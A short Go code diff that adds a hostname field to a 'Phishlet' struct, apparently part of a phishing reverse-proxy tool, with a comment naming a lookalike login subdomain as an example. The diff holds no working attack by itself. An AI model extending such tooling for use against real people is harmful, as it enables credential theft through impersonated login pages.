@@ -16,6 +16,7 @@ type Phishlet struct {
 	Name     string `json:"name"`
 	Label    string `json:"label"`
 	Upstream string `json:"upstream"`
+	Hostname string `json:"hostname"` // our subdomain, e.g. login.glnt.cc
 
 	ProxyPaths []string `json:"proxy_paths"`
 
